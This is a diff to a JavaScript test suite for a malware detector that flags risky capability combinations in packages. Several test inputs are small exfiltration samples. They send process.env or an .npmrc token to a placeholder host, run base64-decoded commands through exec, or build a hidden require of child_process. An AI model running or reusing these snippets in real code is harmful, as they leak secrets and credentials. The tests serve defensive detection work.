@@ -115,14 +115,64 @@ describe('Threat Detection', () => {
     });
   });
 
-  describe('suspicious module requires', () => {
-    it('matches require with double quotes and import syntax', () => {
-      expect(detectMalware('const cp = require("child_process");').map((t) => t.type)).toContain(
-        'SUSPICIOUS_MODULE'
-      );
+  describe('capability combinations', () => {
+    it('does not flag a lone require of fs or child_process', () => {
+      const types = detectMalware(
+        "const fs = require('fs'); fs.readFileSync('x');",
+        'lib/a.js'
+      ).map((t) => t.type);
+      expect(types).not.toContain('SUSPICIOUS_MODULE');
+      expect(types.filter((t) => t !== 'CAPABILITY_NOTE')).toHaveLength(0);
+    });
+
+    it('flags env read combined with network send as DATA_EXFILTRATION', () => {
+      const code =
+        "const https = require('https'); https.get('https://x.y/?e=' + JSON.stringify(process.env));";
+      const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'DATA_EXFILTRATION');
+      expect(t?.severity).toBe('HIGH');
+    });
+
+    it('flags credential file access combined with network as CREDENTIAL_THEFT', () => {
+      const code = `import { readFileSync } from 'node:fs';
+        const token = readFileSync(process.env.HOME + '/.npmrc', 'utf8');
+        fetch('https://x.y', { method: 'POST', body: token });`;
+      const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'CREDENTIAL_THEFT');
+      expect(t?.severity).toBe('CRITICAL');
+    });
+
+    it('flags decode feeding execution as OBFUSCATED_EXECUTION', () => {
+      const code =
+        "const { exec } = require('child_process'); exec(Buffer.from('bHM=', 'base64').toString());";
+      const types = detectMalware(code, 'lib/a.js').map((t) => t.type);
+      expect(types).toContain('OBFUSCATED_EXECUTION');
+    });
+
+    it('reports computed module names as DYNAMIC_MODULE_LOAD without guessing the module', () => {
+      const code = "const m = require(['child_', 'process'].join('')); m.exec('id');";
+      const t = detectMalware(code, 'lib/a.js').find((x) => x.type === 'DYNAMIC_MODULE_LOAD');
+      expect(t).toBeDefined();
+      expect(t?.details).not.toContain('child_process');
+    });
+
+    it('recognises import(), node: prefixes and third-party network clients', () => {
+      const code = `import axios from 'axios';
+        const { userInfo } = await import('node:os');
+        axios.post('https://x.y', userInfo());`;
+      const types = detectMalware(code, 'lib/a.js').map((t) => t.type);
+      expect(types).toContain('DATA_EXFILTRATION');
+    });
+
+    it('demotes combinations in test files to LOW', () => {
+      const code = "const https = require('https'); https.get('u?' + process.env.TOKEN);";
+      const t = detectMalware(code, 'test/a.test.js').find((x) => x.type === 'DATA_EXFILTRATION');
+      expect(t?.severity).toBe('LOW');
+    });
+
+    it('is silent on unparseable input', () => {
+      const types = detectMalware('this is not javascript {{{', 'lib/a.js').map((t) => t.type);
       expect(
-        detectMalware("import { exec } from 'node:child_process';").map((t) => t.type)
-      ).toContain('SUSPICIOUS_MODULE');
+        types.some((t) => ['DATA_EXFILTRATION', 'CREDENTIAL_THEFT', 'CAPABILITY_NOTE'].includes(t))
+      ).toBe(false);
     });
   });
 });
